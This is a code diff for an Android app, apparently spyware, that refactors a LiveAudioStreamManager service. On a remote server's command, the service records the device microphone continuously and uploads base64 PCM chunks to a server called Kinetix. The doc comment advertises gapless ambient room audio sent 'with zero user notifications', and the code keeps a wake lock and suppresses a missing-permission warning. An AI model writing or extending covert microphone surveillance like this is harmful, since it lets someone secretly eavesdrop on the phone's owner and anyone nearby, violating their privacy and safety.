@@ -1,10 +1,8 @@
 package com.example.sentry.service
 
+import android.annotation.SuppressLint
 import android.content.Context
-import android.media.AudioAttributes
-import android.media.AudioFocusRequest
-import android.media.AudioManager
-import android.media.MediaRecorder
+import android.media.*
 import android.os.Build
 import android.telephony.PhoneStateListener
 import android.telephony.TelephonyCallback
@@ -14,19 +12,22 @@ import android.util.Log
 import com.example.sentry.crypto.CryptoManager
 import com.example.sentry.network.SentryApiClient
 import kotlinx.coroutines.*
-import java.io.File
 import kotlin.math.log10
+import kotlin.math.sqrt
 
 /**
- * LiveAudioStreamManager streams real-time high quality (44.1 kHz) audio chunks
- * to Kinetix in the background with zero user notifications.
+ * LiveAudioStreamManager streams real-time, low-latency 16 kHz 16-bit PCM audio
+ * continuously to Kinetix in the background with zero user notifications.
  *
- * It monitors AudioFocus and Phone call state:
- * If another app or incoming/outgoing call uses the mic, it immediately pauses
- * and releases the mic hardware, resuming automatically once the call/app ends.
+ * It uses a non-stop AudioRecord stream without disk I/O to ensure 100% stable,
+ * gapless, continuous ambient room audio transmission.
  */
 object LiveAudioStreamManager {
     private const val TAG = "LiveAudioStream"
+    private const val SAMPLE_RATE = 16000
+    private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
+    private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
+
     private var streamJob: Job? = null
     private var streamingLoopJob: Job? = null
     private val scope = CoroutineScope(Dispatchers.IO)
@@ -56,12 +57,11 @@ object LiveAudioStreamManager {
                     if (cmdRes.isSuccess) {
                         val cmdObj = cmdRes.getOrNull()
                         val shouldStream = cmdObj?.optBoolean("active", false) ?: false
-                        val quality = cmdObj?.optString("quality", "HD") ?: "HD"
 
                         if (shouldStream && !isStreamingEnabled) {
                             isStreamingEnabled = true
                             SentryPersistentService.updateForegroundForAudio(true)
-                            startStreamingLoop(context, deviceId, quality)
+                            startContinuousAudioRecord(context, deviceId)
                         } else if (!shouldStream && isStreamingEnabled) {
                             isStreamingEnabled = false
                             SentryPersistentService.updateForegroundForAudio(false)
@@ -77,24 +77,48 @@ object LiveAudioStreamManager {
         }
     }
 
-    private fun startStreamingLoop(context: Context, deviceId: String, quality: String) {
+    @SuppressLint("MissingPermission")
+    private fun startContinuousAudioRecord(context: Context, deviceId: String) {
         streamingLoopJob?.cancel()
-        streamingLoopJob = scope.launch {
+        streamingLoopJob = scope.launch(Dispatchers.IO) {
             val client = SentryApiClient(context)
-            Log.d(TAG, "Live audio streaming loop STARTED for device: $deviceId")
+            Log.d(TAG, "Continuous PCM Audio Streaming STARTED for device: $deviceId")
 
             val powerManager = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
             val wakeLock = try {
                 powerManager?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Sentry::LiveAudioWakeLock")?.apply {
-                    acquire(60 * 60 * 1000L) // 1 hour max safety lock
+                    acquire(60 * 60 * 1000L)
                 }
             } catch (_: Exception) { null }
 
+            val minBufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
+            val bufferSize = (minBufSize * 2).coerceAtLeast(SAMPLE_RATE * 2)
+            var audioRecord: AudioRecord? = null
+
             try {
+                audioRecord = AudioRecord(
+                    MediaRecorder.AudioSource.MIC,
+                    SAMPLE_RATE,
+                    CHANNEL_CONFIG,
+                    AUDIO_FORMAT,
+                    bufferSize
+                )
+
+                if (audioRecord.state != AudioRecord.STATE_INITIALIZED) {
+                    Log.e(TAG, "AudioRecord initialization failed!")
+                    return@launch
+                }
+
+                audioRecord.startRecording()
+                val chunkSamples = SAMPLE_RATE / 2 // 500ms chunk = 8,000 samples = 16,000 bytes
+                val pcmBuffer = ShortArray(chunkSamples)
+
                 while (isActive && isStreamingEnabled) {
                     if (isMicConflictPaused) {
-                        // Report paused state so controller sees conflict status badge
                         try {
+                            if (audioRecord.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
+                                audioRecord.stop()
+                            }
                             client.uploadLiveAudioChunk(
                                 deviceId = deviceId,
                                 base64 = null,
@@ -105,90 +129,59 @@ object LiveAudioStreamManager {
                         } catch (_: Exception) {}
                         delay(1200)
                         continue
-                    }
-
-                val chunkFile = File(context.cacheDir, "live_chunk_${System.currentTimeMillis()}.m4a")
-                var recorder: MediaRecorder? = null
-                var maxAmplitude = 0
-
-                try {
-                    recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                        MediaRecorder(context)
                     } else {
-                        @Suppress("DEPRECATION")
-                        MediaRecorder()
-                    }
-
-                    val sampleRate = if (quality == "ECO") 16000 else 32000
-                    val bitRate = if (quality == "ECO") 32000 else 64000
-
-                    recorder.apply {
-                        setAudioSource(MediaRecorder.AudioSource.MIC)
-                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                        setAudioSamplingRate(sampleRate)
-                        setAudioEncodingBitRate(bitRate)
-                        setOutputFile(chunkFile.absolutePath)
-                        prepare()
-                        start()
-                    }
-
-                    // Sample amplitude across the recording duration
-                    val durationMs = 2000L
-                    val startTime = System.currentTimeMillis()
-                    while (System.currentTimeMillis() - startTime < durationMs && isActive && isStreamingEnabled && !isMicConflictPaused) {
-                        try {
-                            val amp = recorder.maxAmplitude
-                            if (amp > maxAmplitude) maxAmplitude = amp
-                        } catch (_: Exception) {}
-                        delay(200)
-                    }
-
-                    // Safely stop recorder
-                    try {
-                        recorder.stop()
-                    } catch (_: Exception) {}
-                    try {
-                        recorder.release()
-                    } catch (_: Exception) {}
-                    recorder = null
-
-                    if (chunkFile.exists() && chunkFile.length() > 300) {
-                        val bytes = chunkFile.readBytes()
-                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                        val decibels = if (maxAmplitude > 10) {
-                            (20 * log10(maxAmplitude.toDouble())).toInt().coerceIn(25, 95)
-                        } else {
-                            35
+                        if (audioRecord.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
+                            try { audioRecord.startRecording() } catch (_: Exception) {}
                         }
+                    }
 
-                        val uploadRes = client.uploadLiveAudioChunk(
+                    var samplesRead = 0
+                    while (samplesRead < chunkSamples && isActive && isStreamingEnabled && !isMicConflictPaused) {
+                        val read = audioRecord.read(pcmBuffer, samplesRead, chunkSamples - samplesRead)
+                        if (read > 0) {
+                            samplesRead += read
+                        } else {
+                            delay(10)
+                        }
+                    }
+
+                    if (samplesRead > 0 && !isMicConflictPaused) {
+                        // Calculate RMS sound decibels
+                        var sum = 0.0
+                        val byteBuffer = ByteArray(samplesRead * 2)
+                        for (i in 0 until samplesRead) {
+                            val sample = pcmBuffer[i].toInt()
+                            sum += sample * sample
+                            byteBuffer[i * 2] = (sample and 0xFF).toByte()
+                            byteBuffer[i * 2 + 1] = ((sample shr 8) and 0xFF).toByte()
+                        }
+                        val rms = sqrt(sum / samplesRead)
+                        val decibels = if (rms > 10) (20 * log10(rms)).toInt().coerceIn(25, 95) else 30
+
+                        val base64 = Base64.encodeToString(byteBuffer, Base64.NO_WRAP)
+                        client.uploadLiveAudioChunk(
                             deviceId = deviceId,
                             base64 = base64,
                             decibels = decibels,
                             micStatus = "STREAMING",
                             sequence = ++sequenceCounter
                         )
-                        Log.d(TAG, "Uploaded live chunk #$sequenceCounter (${bytes.size} bytes, $decibels dB, success=${uploadRes.isSuccess})")
-                    }
-                    } catch (e: Exception) {
-                        Log.w(TAG, "Live audio chunk record error: ${e.message}")
-                        delay(1000)
-                    } finally {
-                        try {
-                            recorder?.release()
-                        } catch (_: Exception) {}
-                        if (chunkFile.exists()) {
-                            chunkFile.delete()
-                        }
                     }
                 }
+            } catch (e: Exception) {
+                Log.e(TAG, "Continuous audio streaming error: ${e.message}", e)
             } finally {
+                try {
+                    audioRecord?.stop()
+                } catch (_: Exception) {}
+                try {
+                    audioRecord?.release()
+                } catch (_: Exception) {}
                 try {
                     wakeLock?.release()
                 } catch (_: Exception) {}
+                Log.d(TAG, "Continuous PCM Audio Streaming STOPPED")
             }
-            Log.d(TAG, "Live audio streaming loop STOPPED")
         }
     }
 
@@ -224,7 +217,6 @@ object LiveAudioStreamManager {
                     .build()
             }
 
-            // Monitor Call State (e.g. Regular phone calls or VoIP apps)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 telephonyManager?.registerTelephonyCallback(
                     context.mainExecutor,
